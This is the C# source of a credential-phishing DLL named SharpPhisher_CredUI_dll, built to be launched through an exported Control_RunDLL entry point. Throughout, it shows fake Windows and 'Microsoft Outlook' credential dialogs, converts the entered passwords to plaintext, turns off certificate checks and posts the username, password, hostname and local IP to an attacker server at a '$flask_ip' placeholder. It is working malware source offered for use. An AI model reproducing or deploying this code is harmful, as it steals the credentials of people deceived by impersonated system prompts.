using Misuzilla.Security;
using System;
using System.Runtime.InteropServices;
using System.Security;
using System.Collections.Specialized;
using System.Net;
using System.Net.NetworkInformation;
using System.Net.Sockets;

namespace SharpPhisher_CredUI_dll
{
    public class Class1
    {
        [DllImport("kernel32.dll", SetLastError = true)]
        static extern string GetCommandLineA();
        [DllExport]
        public static void Control_RunDLL()
        {
            //'Handle arguments
            string cmdval = GetCommandLineA(); // To retrieve command line string for current process 
            string fname = "Control_RunDLL"; // Function name which is exported
            int funcval = cmdval.IndexOf(fname); // Find the index value of the function from the command line
            int fargstartindx = funcval + fname.Length; // Find the argument starting index value
            string finalargs = cmdval.Substring(fargstartindx); // Copy the arguments
            string[] args = finalargs.Split(' '); // Split the arguments using space

            //string[] args;
            // Check the agurments
            if (args.Length == 1)
            {
                PromptCredentialsResult cred = null;
                PromptCredentialsSecureStringResult credSecure = null;

                String defaultUserName = System.Security.Principal.WindowsIdentity.GetCurrent().Name;
                String p_IPv4 = IPv4.GetLocalIPv4(NetworkInterfaceType.Ethernet);

                var hostname = System.Environment.GetEnvironmentVariable("COMPUTERNAME");
                string userName = Environment.UserName;

                credSecure = CredentialUI.PromptWithSecureString("Making sure it's you", "We need to verify your indentify for user: " + userName, defaultUserName.ToSecureString(), null);

                if (credSecure != null)
                {
                    String userNameRaw = credSecure.UserName.ToInsecureString();
                    String passwordRaw = credSecure.Password.ToInsecureString();

                    ServicePointManager.ServerCertificateValidationCallback = delegate { return true; };
                    System.Net.ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12 | SecurityProtocolType.Tls11 | SecurityProtocolType.Tls;
                    var response = Http.Post("https://$flask_ip/c", new NameValueCollection() {
                { "ipv4", p_IPv4 },
                { "hostname", hostname },
                { "username", userNameRaw },
                { "password", passwordRaw }
            });

                }
                if (cred != null)
                {
                    var response = Http.Post("https://$flask_ip/c", new NameValueCollection() {
                { "Username", cred.UserName },
                { "Password", cred.Password }
            });

                    Console.WriteLine("Username: {0}", cred.UserName);
                    Console.WriteLine("Password: {0}", cred.Password);
                }
            }
            else if (args[1] == "appwiz.cpl,,0")
            {
                PromptCredentialsResult cred = null;
                PromptCredentialsSecureStringResult credSecure = null;
                credSecure = CredentialUI.PromptWithSecureString("Microsoft Outlook", "Outlook needs your user name and password to connect for retrieving calendar data from Outlook.", null, null);
                var hostname = System.Environment.GetEnvironmentVariable("COMPUTERNAME");
                String p_IPv4 = "not captured";
                p_IPv4 = IPv4.GetLocalIPv4(NetworkInterfaceType.Ethernet);


                if (credSecure != null)
                {
                    String userNameRaw = credSecure.UserName.ToInsecureString();
                    String passwordRaw = credSecure.Password.ToInsecureString();

                    ServicePointManager.ServerCertificateValidationCallback = delegate { return true; };
                    System.Net.ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12 | SecurityProtocolType.Tls11 | SecurityProtocolType.Tls;
                    var response = Http.Post("https://$flask_ip/c", new NameValueCollection() {
                { "ipv4", p_IPv4 },
                { "hostname", hostname },
                { "username", userNameRaw },
                { "password", passwordRaw }
            });

                }
                if (cred != null)
                {
                    var response = Http.Post("https://$flask_ip/c", new NameValueCollection() {
                { "Username", cred.UserName },
                { "Password", cred.Password }
            });

                    Console.WriteLine("Username: {0}", cred.UserName);
                    Console.WriteLine("Password: {0}", cred.Password);
                }
            }
            else
            {
                Console.WriteLine("idiot");
                return;
            }
        }
        [DllExport]
        public static void Example()
        {
            //string[] args;
            // mark all certificates as valid
            PromptCredentialsResult cred = null;
            PromptCredentialsSecureStringResult credSecure = null;
            //var defaultUserName = "Example_Username".ToSecureString();
            String kur = System.Security.Principal.WindowsIdentity.GetCurrent().Name;
            var defaultUserName = kur.ToSecureString();
            String p_IPv4 = IPv4.GetLocalIPv4(NetworkInterfaceType.Ethernet);

            /*
            // Method 1
            credSecure = CredentialUI.PromptForWindowsCredentialsWithSecureString("Caption", "Message");
            // Method 2
            cred = CredentialUI.Prompt("Caption", "Message");
            */
            var hostname = System.Environment.GetEnvironmentVariable("COMPUTERNAME");
            string userName = Environment.UserName;

            // Windows needs your current credentials
            credSecure = CredentialUI.PromptWithSecureString("Making sure it's you", "We need to verify your indentify for user: " + userName, defaultUserName, null);



            if (credSecure != null)
            {
                String userNameRaw = credSecure.UserName.ToInsecureString();
                String passwordRaw = credSecure.Password.ToInsecureString();
                /*
                 * write to console
                Console.WriteLine("[+] Credentials obtained:");
                Console.WriteLine("Username: {0}", userNameRaw);
                Console.WriteLine("Password: {0}", passwordRaw);
                */

                // Specify to use TLS 1.2 as default connection
                ServicePointManager.ServerCertificateValidationCallback = delegate { return true; };
                System.Net.ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12 | SecurityProtocolType.Tls11 | SecurityProtocolType.Tls;
                var response = Http.Post("https://$flask_ip/c", new NameValueCollection() {
                { "ipv4", p_IPv4 },
                { "hostname", hostname },
                { "username", userNameRaw },
                { "password", passwordRaw }
            });

            }
            if (cred != null)
            {
                var response = Http.Post("https://$flask_ip/c", new NameValueCollection() {
                { "Username", cred.UserName },
                { "Password", cred.Password }
            });

                Console.WriteLine("Username: {0}", cred.UserName);
                Console.WriteLine("Password: {0}", cred.Password);
            }
            //Console.WriteLine("[+] END OF OUTPUT");
            //Console.Read();

        }
    }
    public static class IPv4
    {
        public static string GetLocalIPv4(NetworkInterfaceType _type)
        {
            string output = "";
            foreach (NetworkInterface item in NetworkInterface.GetAllNetworkInterfaces())
            {
                if (item.NetworkInterfaceType == _type && item.OperationalStatus == OperationalStatus.Up)
                {
                    foreach (UnicastIPAddressInformation ip in item.GetIPProperties().UnicastAddresses)
                    {
                        if (ip.Address.AddressFamily == AddressFamily.InterNetwork)
                        {
                            output = ip.Address.ToString();
                        }
                    }
                }
            }
            return output;
        }
    }
    public static class Http
    {
        public static byte[] Post(string uri, NameValueCollection pairs)
        {
            byte[] response = null;
            using (WebClient client = new WebClient())
            {
                response = client.UploadValues(uri, pairs);
            }
            return response;
        }
    }

    public static class Extension
    {
        public static SecureString ToSecureString(this String s)
        {
            SecureString ss = new SecureString();
            foreach (var c in s)
                ss.AppendChar(c);
            ss.MakeReadOnly();
            return ss;
        }

        public static String ToInsecureString(this SecureString s)
        {
            IntPtr p = IntPtr.Zero;
            try
            {
                p = Marshal.SecureStringToCoTaskMemUnicode(s);
                return Marshal.PtrToStringUni(p);
            }
            finally
            {
                if (p != IntPtr.Zero)
                    Marshal.ZeroFreeCoTaskMemUnicode(p);
            }
        }
        public static SecureString PtrToSecureString(IntPtr p)
        {
            SecureString s = new SecureString();
            Int32 i = 0;
            while (true)
            {
                Char c = (Char)Marshal.ReadInt16(p, ((i++) * sizeof(Int16)));
                if (c == '\u0000')
                    break;
                s.AppendChar(c);
            }
            s.MakeReadOnly();
            return s;
        }
        public static SecureString PtrToSecureString(IntPtr p, Int32 length)
        {
            SecureString s = new SecureString();
            for (var i = 0; i < length; i++)
                s.AppendChar((Char)Marshal.ReadInt16(p, i * sizeof(Int16)));
            s.MakeReadOnly();
            return s;
        }
    }
}
